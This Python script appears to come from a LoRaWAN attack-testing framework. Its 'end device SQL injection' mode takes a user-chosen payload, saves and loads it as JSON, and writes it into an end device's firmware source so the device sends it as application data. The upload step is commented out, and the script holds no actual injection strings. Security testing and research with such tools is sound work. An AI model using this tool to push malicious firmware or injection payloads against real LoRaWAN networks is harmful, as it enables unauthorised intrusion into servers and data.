import os
import sys
import json
import subprocess


save_flag = 0
service_path = "/opt/vulnelora"
lomab_dir = service_path + "/resources/LoMAB"


attack_config = {'payload': ""}


def check_save():
    if save_flag == 0:
        print("\n>> Current attack configuration not saved, would you like to save it? [y/n] ", end='')
        save_req = input()

        if save_req.strip().lower() == "y":
            print("\n>> Enter path (including file name) where the attack configuration should be saved: ", end='')
            path = input()
            save_conf(path)
        elif save_req.strip().lower() == "n":
            pass
        else:
            print("\n>> Valid answers are 'y' or 'n'. Any other answers are interpreted same as 'n'.")


def extract(text, value):
    return text[len(value)+1:].strip()


def validate_path(value):
    if os.path.exists(value):
        return os.path.getsize(value) > 0
    else:
        return 0


def print_args():
    formatted_args = json.dumps(attack_config, indent=4)
    print(formatted_args)


def save_conf(path):
    with open(path, 'w') as file_w:
        json.dump(attack_config, file_w)
    with open(path, 'r') as file_r:
        file_content = json.load(file_r)
        if file_content == attack_config:
            global save_flag
            save_flag = 1
            print(f"\n>> [SUCCESS]: Current attack configuration saved successfully in '{path}'!")
        else:
            print("\n>> [ERROR]: Attack configuration has not beed saved correctly due to unknown error. Please, try again.")


def transfer_conf(loaded_conf):
        global attack_config
        attack_config.update(loaded_conf)


def argument_parser():
    argument = sys.argv[1]
    base_name, extension = os.path.splitext(argument)

    while True:
        print(f"\033[96m\nvulora\033[0m[\033[91m{base_name}\033[96m]>\033[0m ", end='')
        arg_input = input()

        if arg_input == "help":
            with open(service_path + '/modes/help_messages/end_device_sql_injection.txt', 'r') as file:
                file_content = file.read()
                print(file_content)
        elif "payload" in arg_input:
            tmp_payload = extract(arg_input, "payload")
            if len(str(tmp_payload)) < 255:
                attack_config['payload'] = str(tmp_payload)
                print(f"\n>> Set argument: payload={tmp_payload}")
            else:
                attack_config['payload'] = ""
                print(f"\n>> Set argument: payload='' (revert to default value, payload must be less than 255 characters)")
        elif arg_input == "print":
            print("\n>> Current argument configuration:")
            print_args()
        elif "save" in arg_input:
            tmp_path = extract(arg_input, 'save')
            if validate_path(tmp_path):
                print("\n>> Path to save current attack configuration already exists. Overwrite? [y/n] ", end='')
                overwrite = input()
                if overwrite.strip().lower() == "y":
                    save_conf(tmp_path)
                elif overwrite.strip().lower() == "n":
                    pass
                else:
                    print("\n>> Valid answers are 'y' or 'n'. Any other answers are interpreted same as 'n'.")
            else:
                if tmp_path != "":
                    save_conf(tmp_path)
                else:
                    print("\n>> [ERROR]: Attack configuration not saved. Please, input a valid path (including file name).")
        elif "load" in arg_input:
            tmp_path = extract(arg_input, 'load')
            if validate_path(tmp_path) and tmp_path != "":
                with open(tmp_path, 'r') as file:
                    file_content = json.load(file)
                    transfer_conf(file_content)
                    if attack_config == file_content:
                        print("\n>> [SUCCESS]: Attack configuration has been loaded successfully! Current configuration is:")
                        print_args()
                    else:
                        print("\n>> [ERROR]: Attack configuration has not been loaded due to unknown error. Please, try again.")
            else:
                print("\n>> [ERROR]: File does not exist.")
        elif arg_input == "finish":
            print("\n>> Final attack configuration:")
            print_args()
            print()
            check_save()
            break
        elif arg_input == "exit":
            check_save()
            exit(0)
        else:
            print(f"\n[ERROR]: Unknown argument '{arg_input}'. Type 'help' to see the supported arguments.")


def run_attack():
    payload_length = len(str(attack_config['payload'])) + 1
    new_payload = f"  uint8_t appData[APP_DATA_LEN] = \"{attack_config['payload']}\"; //user application data\n"
    new_payload_size = f"#define APP_DATA_LEN {payload_length}\n"
    found = 0
    content = []

    with open(f"{lomab_dir}/src/main.cpp", 'r') as file_r:
        content = file_r.readlines()

        for i, line in enumerate(content):
            if "//user application data" in line:
                content[i] = new_payload
                found = found + 1
            if "#define APP_DATA_LEN" in line:
                content[i] = new_payload_size
                found = found + 1
            if found >= 2:
                break

    with open(f"{lomab_dir}/src/main.cpp", 'w') as file_w:
        file_w.writelines(content)

    print("\n[INFO]: Uploading the malicious firmware to the end device...\n")

#    subprocess.run(["pio", "run", "-d", lomab_dir])
#    subprocess.run(["pio", "run", "-d", lomab_dir, "-t", "upload"])


def detect_device():
    try:
        with open(f"{service_path}/setup_files/device_info", 'r') as file:
            content = file.read()
            if "RASPBERRY" in content.upper():
                print("[WARNING]: It is not recommended to run this attack on Raspberry Pi, because you may encounter some issues with uploading firmware to an end device.\nIf you wish to run this attack, it is better to do so on some other devices.")
    except Exception:
        print("[ERROR]: Cannot identify the device type.")
        print("[WARNING]: It is not recommended to run this attack on Raspberry Pi, because you may encounter some issues with uploading firmware to an end device.\nIf you wish to run this attack, it is better to do so on some other devices.")


if __name__ == "__main__":
    try:
        detect_device()
        argument_parser()
        run_attack()
    except KeyboardInterrupt:
        exit(0)

    exit(0)
